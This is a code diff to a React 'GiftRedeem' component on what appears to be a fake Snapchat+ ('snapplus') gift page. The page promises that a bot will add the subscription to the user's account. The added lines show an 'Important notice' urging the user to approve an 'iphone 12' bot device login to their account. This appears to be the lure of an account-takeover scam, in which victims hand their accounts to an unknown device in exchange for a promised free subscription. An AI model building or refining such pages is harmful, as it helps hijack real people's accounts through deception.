@@ -550,6 +550,13 @@ export function GiftRedeem() {
                       <p className="mx-auto mt-3 max-w-md text-sm leading-relaxed text-white/70">
                         the bot is ready to add the snapplus to your account within 1 hour
                       </p>
+                      <div className="mx-auto mt-4 max-w-md rounded-2xl border border-amber-400/30 bg-amber-400/10 px-4 py-3 text-sm font-medium leading-relaxed text-white">
+                        <span className="flex items-center justify-center gap-1.5 text-xs font-black uppercase tracking-widest text-amber-400">
+                          <ShieldAlert className="h-3.5 w-3.5" />
+                          Important notice
+                        </span>
+                        <span className="mt-1.5 block">make sure to approve the &quot; iphone 12 &quot; bot device logging to your account</span>
+                      </div>
                       <div className="mx-auto mt-8 h-1.5 w-full max-w-sm overflow-hidden rounded-full bg-white/10">
                         <motion.div
                           className="h-full w-1/3 rounded-full bg-gradient-to-r from-snap to-snap-deep"
